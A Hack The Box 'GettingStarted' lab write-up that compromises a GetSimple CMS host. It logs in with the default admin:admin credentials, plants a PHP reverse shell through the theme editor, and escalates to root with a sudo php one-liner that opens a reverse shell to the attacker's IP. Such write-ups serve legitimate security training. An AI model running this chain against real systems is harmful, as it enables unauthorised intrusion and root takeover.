# HTB - GettingStarted

#HTB #GettingStarted #GetSimple #PHP #FileUpload #sudo #Easy

Target: 10.129.211.97 (`gettingstarted.htb`)

## Services

- 22/tcp  ssh    OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
- 80/tcp  http   Apache httpd 2.4.41 (Ubuntu) — GetSimple CMS, "Welcome to GetSimple! - gettingstarted"

## Versions

| Component | Version |
|---|---|
| OS | Ubuntu 20.04.2 |
| Apache | 2.4.41 |
| PHP | 7.4.3 |
| GetSimple CMS | 3.3.15 |
| MySQL | 8.0.23-0ubuntu0.20.04.1 |
| sudo | 1.8.31 |
| fancybox | 2.0.4 |
| jQuery | 3.3.15 |

## Recon

```bash
nmap -sV --open -oA initial_scan 10.129.211.97
# 22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
# 80/tcp open  http  Apache httpd 2.4.41 ((Ubuntu))

nmap -p- --open -oA full_tcp_scan 10.129.211.97
# nothing new

nmap -sC -p 22,80 -oA script_scan 10.129.211.97
```

Script scan output:

```
22/tcp open  ssh
| ssh-hostkey:
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http
| http-robots.txt: 1 disallowed entry
|_/admin/
|_http-title: Welcome to GetSimple! - gettingstarted
```

## Findings

- `robots.txt` discloses `/admin/` — the CMS login.
- Admin page fingerprints jQuery 3.3.15 and fancybox 2.0.4.
- **Admin → Support** confirms GetSimple 3.3.15 / PHP 7.4.3 / Apache 2.4.41 and reports **a number of writeable directories**.
- **Admin → Upload** allows creating folders and browsing uploaded files.
- **Admin → Theme** allows editing theme files **as PHP** — this is the code-execution primitive.

## Creds

- `admin:admin` — guessed, works on `/admin/`.

## Foothold

Theme editor → drop a PHP reverse shell into a theme file, then request it directly:

```bash
# Payload source
# https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

nc -lvnp 9001
```

Shell lands at:

```
http://gettingstarted.htb/theme/Cardinal/template.php
```

Upgrade the TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
cd /home/mrb3n
cat user.txt
```

## Privesc

Enumeration as `www-data`:

```bash
sudo -l
# (www-data may run) /usr/bin/php
```

`linenum.sh` confirmed Ubuntu 20.04.2.

`php` under sudo with no restriction is a direct GTFOBins root — spawn a second shell as root:

```bash
sudo /usr/bin/php -r '$sock=fsockopen("10.10.15.74",9002);exec("/bin/sh -i <&3 >&3 2>&3");'
# catcher:
nc -lvnp 9002
```

## Flags

- user: `/home/mrb3n/user.txt`
- root: obtained via `sudo /usr/bin/php` GTFOBins escape

## Users

- `mrb3n`
